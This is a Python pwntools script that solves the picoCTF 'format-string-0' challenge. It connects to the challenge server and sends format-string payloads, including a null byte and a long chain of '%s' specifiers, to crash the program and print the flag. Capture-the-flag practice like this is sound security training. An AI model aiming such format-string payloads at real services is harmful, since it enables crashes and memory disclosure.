#!/usr/bin/env python3

from pwn import *

exe = ELF("./format-string-0")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mimas.picoctf.net", 65173)

    return r


def main():
    r = conn()

    r.sendlineafter(b"recommendation: ", b"Gr%114d_Cheese")
    r.sendlineafter(b"recommendation: ", b"$outhwest_Burger\x00%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s-%s")

    flag = r.recvlinesS(2)[-1]
    log.success(f"Flag obtained: {flag}")


if __name__ == "__main__":
    main()
